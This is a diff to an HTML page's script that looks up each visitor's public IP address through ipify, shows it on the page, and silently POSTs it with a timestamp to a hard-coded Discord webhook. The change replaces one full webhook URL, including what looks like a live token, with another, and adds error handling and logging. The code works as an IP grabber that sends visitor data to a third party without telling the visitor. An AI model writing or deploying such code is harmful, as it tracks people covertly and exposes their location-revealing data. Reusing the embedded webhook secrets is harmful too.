@@ -9,30 +9,36 @@
 <p id="ipDisplay">Loading your IP...</p>
 
 <script>
-  // Replace this with your webhook URL:
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1397185556118634636/fYxi0tlwBM3vbmZUe66OrY0J-kKeL2oAMArqyW5l20KbVa1ivnmLIxwGeik2cTrbJsN2"; // <-- change this
+  // Replace with your real webhook URL (Discord or your server)
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1434137186806005820/Lrf8JKjayqMQT2SYt2y-0WCSUSHHpOnJ5BGPiyc3ld6wI8RonJ0NrWcBzawpI65RQSMz";
 
   async function getIp() {
     try {
-      // 1. Get public IP from ipify
+      // Step 1: Get the IP
       const response = await fetch('https://api.ipify.org?format=json');
       const data = await response.json();
       const ip = data.ip;
-
-      // 2. Display it on the page
       document.getElementById('ipDisplay').textContent = 'Your IP is: ' + ip;
 
-      // 3. Send the IP to your webhook
-      await fetch(WEBHOOK_URL, {
+      console.log('Fetched IP:', ip);
+
+      // Step 2: Send to webhook
+      const payload = { ip: ip, time: new Date().toISOString() };
+
+      const webhookResponse = await fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ ip: ip, time: new Date().toISOString() })
+        body: JSON.stringify(payload)
       });
 
-      console.log('IP sent to webhook:', ip);
+      if (!webhookResponse.ok) {
+        throw new Error(`Webhook returned ${webhookResponse.status}`);
+      }
+
+      console.log('Successfully sent IP to webhook');
     } catch (error) {
-      document.getElementById('ipDisplay').textContent = 'Unable to fetch IP address.';
-      console.error('Error fetching or sending IP:', error);
+      console.error('Error:', error);
+      document.getElementById('ipDisplay').textContent = 'Error: ' + error.message;
     }
   }
 
@@ -40,3 +46,4 @@
 </script>
 </body>
 </html>
+
